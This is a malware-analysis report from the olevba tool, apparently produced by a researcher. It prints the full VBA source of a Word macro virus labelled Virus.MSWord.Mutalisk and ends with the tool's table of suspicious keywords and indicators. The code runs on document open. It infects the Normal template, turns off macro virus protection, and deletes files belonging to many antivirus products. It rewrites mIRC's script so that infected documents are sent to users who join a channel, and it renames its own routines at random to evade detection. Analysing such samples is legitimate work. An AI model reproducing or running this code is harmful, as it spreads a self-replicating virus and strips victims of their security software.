olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mutalisk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mutalisk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'xxlss666
Sub zx126003()
On Error Resume Next
Dim NI As Boolean
Dim AI As Boolean
Dim N As Integer
Dim A As Integer
Dim Code As String
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.StatusBar = False
For t = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(t).CodeModule.Lines(1, 1) = "'xxlss666" Then
NI = True
N = t
End If
Next t
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(y).CodeModule.Lines(1, 1) = "'xxlss666" Then
AI = True
A = y
End If
Next y
If NI = True And AI = False Then
r = NormalTemplate.VBProject.VBComponents.Item(N).CodeModule.CountOfLines
Code = NormalTemplate.VBProject.VBComponents.Item(N).CodeModule.Lines(1, r)
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString Code
zx70381 N, True
ElseIf NI = False And AI = True Then
m = ActiveDocument.VBProject.VBComponents.Item(A).CodeModule.CountOfLines
Code = ActiveDocument.VBProject.VBComponents.Item(A).CodeModule.Lines(1, m)
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString Code
zx70381 A, False
End If
End Sub
Sub zx1337865()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\Program Files\FindVirus\Findviru.drv"
Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "C:\eSafe\Protect\*.dll"
Kill "c:\f-macro\f-macro.exe"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "C:\Tbavw95\Tb*.*"
Kill "C:\VS95\*.dll"
End Sub
Sub zx435749()
On Error Resume Next
k = Dir("c:\mirc\mirc32.exe")
If k = "" Then
    Exit Sub
    Else
    m = Dir("c:\mirc\backup\Y2K.doc")
        If m = "" Then ActiveDocument.SaveAs "c:\mirc\backup\Y2K.doc"
    Kill "c:\mirc\script.ini"
    Open "c:\mirc\script.ini" For Random As g
    Print g; "[script]"
    Print g; "n0=on 1:text:*virus*:#:/msg $chan Virus Alert!!!"
    Print g; "n1=on 1:text:*virus*:#:/join #vir"
    Print g; "n2=on 1:text:*vrus*:#:/echo Well thanx for coming in #vir the best channel about viruses"
    Print g; "n3=on 1:nick:/msg $chan $nick changed his name to $newnick"
    Print g; "n4=on 1:join:#:/send $nick c:\mirc\backup\Y2K.doc"
    Close g
Beep
End If
    End Sub
Sub autoopen()
On Error Resume Next
Application.ShowVisualBasicEditor = True
zx126003
zx1337865
zx435749
End Sub
Sub autonew()
On Error Resume Next
Application.ShowVisualBasicEditor = False
zx126003
zx1337865
zx435749
End Sub
Function zx70381(x As Integer, doc As Boolean)
On Error Resume Next
Dim r As Integer, g As String
If doc = False Then
Set grr = NormalTemplate.VBProject.VBComponents
Else
Set grr = ActiveDocument.VBProject.VBComponents
End If
r = Int(15 * Rnd)
f = Int((2354376 * Rnd) + 34)
h = Int((735436 * Rnd) + 34)
p = Int((2854345 * Rnd) + 34)
c = Int((235935 * Rnd) + 34)
If r = 1 Then g = "kk"
If r = 2 Then g = "tr"
If r = 3 Then g = "jp"
If r = 4 Then g = "hh"
If r = 5 Then g = "oo"
If r = 7 Then g = "kl"
If r = 8 Then g = "nb"
If r = 9 Then g = "kr"
If r = 10 Then g = "qw"
If r = 11 Then g = "zx"
If r = 12 Then g = "mp"
If r = 13 Then g = "au"
If r = 14 Then g = "mw"
If r = 15 Then g = "lk"
instal = g & f
payl = g & h
retro = g & p
mut = g & c
ia = g & h
grr.Item(x).CodeModule.replaceline 2, "sub " & instal & "()"
grr.Item(x).CodeModule.replaceline 29, mut & " N, True"
grr.Item(x).CodeModule.replaceline 34, mut & " A, False"
grr.Item(x).CodeModule.replaceline 37, "Sub " & retro & "()"
grr.Item(x).CodeModule.replaceline 58, "Sub " & payl & "()"
grr.Item(x).CodeModule.replaceline 81, instal
grr.Item(x).CodeModule.replaceline 82, retro
grr.Item(x).CodeModule.replaceline 83, payl
grr.Item(x).CodeModule.replaceline 88, instal
grr.Item(x).CodeModule.replaceline 89, retro
grr.Item(x).CodeModule.replaceline 90, payl
grr.Item(x).CodeModule.replaceline 92, "Function " & mut & "(x As Integer, doc As Boolean)"
grr.Item(x).CodeModule.replaceline 144, "'" & ia & (2454356 * Rnd) & retro
grr.Item(x).CodeModule.replaceline 145, "'" & payl & retro & (42354523654647# * Rnd) & retro & (253465356 * Rnd)
grr.Item(x).CodeModule.replaceline 146, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
grr.Item(x).CodeModule.replaceline 147, "'" & retro & (523452345636# * Rnd)
grr.Item(x).CodeModule.replaceline 148, "'" & (243277777777# * Rnd) & "rr" & retro
grr.Item(x).CodeModule.replaceline 149, "'" & ia & retro & (23452352353# * Rnd) & instal
grr.Item(x).CodeModule.replaceline 152, "'" & payl & (2342453636# * Rnd) & instal
grr.Item(x).CodeModule.replaceline 153, "'" & instal & (35443453424869# * Rnd) & retro & payl
'zx4357491528319,3762095zx1337865
'zx435749zx133786527438157829984,9zx133786566862369,4281647
'zx126003zx1337865zx435749zx1260039643909125754,73
'zx1337865434361603905,784
'zx126003zx1337865zx435749zx1260038421402210427,74
'200607373025,041rrzx1337865
grr.Item(x).CodeModule.replaceline 156, "'" & instal & retro & (432534647567654# * Rnd)
grr.Item(x).CodeModule.replaceline 157, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
'zx435749zx133786513817258394,868zx126003
'zx126003zx1337865zx435749zx12600333833295014268,2
grr.Item(x).CodeModule.replaceline 159, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
grr.Item(x).CodeModule.replaceline 160, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
'zx4357492309877516,25258zx126003
'zx12600332287721099200,7zx1337865zx435749
'zx126003zx1337865zx435749zx12600323997928884460,3
grr.Item(x).CodeModule.replaceline 163, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
'zx126003zx133786598127408318463,2
grr.Item(x).CodeModule.replaceline 164, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
grr.Item(x).CodeModule.replaceline 167, "'" & instal & retro & payl & instal & (34523656363456# * Rnd)
'zx126003zx1337865zx435749zx12600318431250797299,4
'zx126003zx1337865zx435749zx1260033672270079773,12
End Function
Sub viewvbcode()
'zx126003zx1337865zx435749zx12600334503444943825,8
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.StatusBar = "|-y0z4C-|"
Options.VirusProtection = False
ActiveDocument.SaveAs "c:\ReadMe.doc"
o = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, o
ActiveDocument.Saved = True
r = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, r
NormalTemplate.Saved = True
Application.ShowVisualBasicEditor = True
End Sub
Sub toolsmacro()
End Sub
Sub filetemplates()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |Cshell.dll          |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|Hex String|B5E#eFG             |42354523654647                               |
|Hex String|%4e5                |25346535                                     |
|Hex String|4R6V64V             |34523656363456                               |
|Hex String|R4R4V6              |523452345636                                 |
|Hex String|$2wwww              |243277777777                                 |
|Hex String|#E#R5               |2345235235                                   |
|Hex String|#BE66               |2342453636                                   |
|Hex String|5D4SBHi             |35443453424869                               |
|Hex String|C%4duge             |43253464756765                               |
+----------+--------------------+---------------------------------------------+

